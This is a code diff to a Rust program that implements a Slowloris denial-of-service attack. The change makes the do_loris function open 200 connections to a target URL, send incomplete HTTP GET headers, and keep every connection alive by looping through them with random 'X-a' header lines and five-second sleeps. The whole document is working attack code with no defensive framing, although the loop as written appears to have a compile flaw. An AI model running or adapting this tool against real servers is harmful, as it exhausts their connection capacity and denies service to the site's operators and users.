@@ -6,7 +6,8 @@ use url::Url;
 use native_tls::{TlsConnector, TlsStream};
 use std::io::{self, Read, Write};
 use std::net::TcpStream;
-
+use std::time::Duration;
+use std::thread;
 
 enum Stream<S>
 where
@@ -49,34 +50,25 @@ where
 
 pub fn do_loris(url: &str) {
     let url = Url::parse(url).unwrap();
+    let mut connections = vec![];
+    let connection_num = 200;
+    for _ in 0..connection_num {
+        let connection = spawn_connection(&url);
+        connections.push(connection);
+    }
 
-
-    /*
-    assert!(url.scheme() == "https");
-    assert!(url.username() == "");
-    assert!(url.password() == None);
-    assert!(url.host_str() == Some("github.com"));
-    assert!(url.host() == Some(Host::Domain("github.com")));
-    assert!(url.port() == None);
-    assert!(url.path() == "/rust-lang/rust/issues");
-    assert!(
-        url.path_segments().map(|c| c.collect::<Vec<_>>()) ==
-            Some(vec!["rust-lang", "rust", "issues"])
-    );
-    assert!(url.query() == Some("labels=E-easy&state=open"));
-    assert!(url.fragment() == None);
-    assert!(!url.cannot_be_a_base());
-    */
-
-    let mut stream = get_stream(&url);
-    let init_header = get_init_header(&url);
-    stream.write_all(&init_header).unwrap();
-    let mut res = vec![];
+    let timeout = 5000;
     loop {
-        let loris_header = get_loris_header();
-        stream.write_all(&loris_header).unwrap();
-        stream.read_to_end(&mut res).unwrap();
-        //println!("{}", String::from_utf8_lossy(&res));
+        for mut connection in connections {
+            let loris_header = get_loris_header();
+            let res = connection.write_all(&loris_header);
+            if res.is_err() {
+                println!("Connection closed!")
+            } else {
+                println!("Sleeping! zZzZzZ");
+                thread::sleep(Duration::from_millis(timeout));
+            }
+        }
     }
 }
 
@@ -93,6 +85,13 @@ fn get_stream(url: &Url) -> Stream<TcpStream> {
     }
 }
 
+fn spawn_connection(url: &Url) -> Stream<TcpStream> {
+    let mut stream = get_stream(&url);
+    let init_header = get_init_header(&url);
+    stream.write_all(&init_header).unwrap();
+    stream
+}
+
 fn get_init_header(url: &Url) -> Vec<u8> {
     format!(
         "GET {} HTTP/1.1\r\n\
@@ -104,9 +103,7 @@ fn get_init_header(url: &Url) -> Vec<u8> {
 }
 
 fn get_loris_header() -> Vec<u8> {
-    format!(
-        "X-a: {}\r\n",
-        rand::random::<u32>(),
-    ).as_bytes()
+    format!("X-a: {}\r\n", rand::random::<u32>(),)
+        .as_bytes()
         .to_vec()
 }
